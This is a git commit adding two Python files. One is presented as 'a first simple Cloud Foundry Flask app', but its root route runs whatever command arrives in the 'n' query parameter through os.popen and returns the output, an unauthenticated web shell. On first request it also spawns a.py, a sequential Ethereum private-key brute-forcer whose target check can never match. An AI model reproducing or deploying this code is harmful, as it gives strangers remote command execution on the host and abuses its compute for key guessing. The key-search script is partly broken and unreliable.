ec89e8b8cbe8ccce0c1b424dcaa33fb01dc1bd72
chamalz <cdrwaopen@gmail.com>
2020-09-12 17:13:48 -0700

    first commit

---
+++ a.py
@@ -0,0 +1,20 @@
+from coincurve import PublicKey
+from sha3 import keccak_256
+import sys
+import time
+cnt=5456454654546
+i=0
+start_time = time.time()
+while i<18000:
+    private_key =cnt.to_bytes(32, byteorder='big')
+    public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
+    addr = keccak_256(public_key).digest()[-20:]
+    addr=addr.hex()
+    private_key=private_key.hex()
+    cnt=cnt+1
+    i=i+1
+    if addr==str("hgjhgjhghjg"):
+     s=private_key+" : "+addr
+f=open("a.txt","a")
+f.write(str((time.time() - start_time))+" add: "+addr)
+f.close()
---
+++ hello.py
@@ -0,0 +1,53 @@
+"""
+A first simple Cloud Foundry Flask app
+
+Author: Ian Huston
+License: See LICENSE.txt
+
+"""
+from flask import Flask
+import os
+
+
+from flask import request
+import multiprocessing
+import threading
+import time
+import subprocess
+
+
+
+
+
+app = Flask(__name__)
+
+# Get port from environment variable or choose 9099 as local default
+port = int(os.getenv("PORT", 9099))
+
+@app.route('/')
+def hello_world():
+    aa=request.args.get("n")
+    #c=int(aa)
+    
+    ff="false"
+    try:
+        f1 = open('myfile.txt')
+        f1.close()
+        ff="true"
+    except FileNotFoundError:
+        ff="false"
+    if ff=="false":
+        f1=open("myfile.txt","a")
+        f1.close()
+        f = subprocess.Popen(["python", "a.py"])
+    
+
+    f = os.popen(str(aa))
+    now = f.read()  
+    
+       
+    return "<xmp>" + 'instance  ' + str(os.getenv("CF_INSTANCE_INDEX", 0))+ "\n" +now+"</xmp>"
+
+if __name__ == '__main__':
+    # Run the app, listening on all IPs with our chosen port number
+    app.run(host='0.0.0.0', port=port)
